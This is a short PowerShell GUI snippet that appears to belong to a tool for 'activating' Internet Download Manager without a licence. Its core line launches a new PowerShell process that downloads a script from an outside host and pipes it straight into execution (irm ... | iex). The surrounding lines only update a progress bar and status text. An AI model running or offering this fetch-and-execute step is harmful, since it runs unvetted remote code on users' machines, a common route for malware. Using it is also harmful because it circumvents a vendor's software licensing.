Clear-Host
$statusLabel.Text = "Activating IDM..."
$progressBar.Value = 0
$mainForm.Refresh()
Start-Process "powershell" -ArgumentList "irm https://coporton.com/ias | iex"
$progressBar.Value = 100
$statusLabel.Text = "IDM activation process launched!"
$mainForm.Refresh()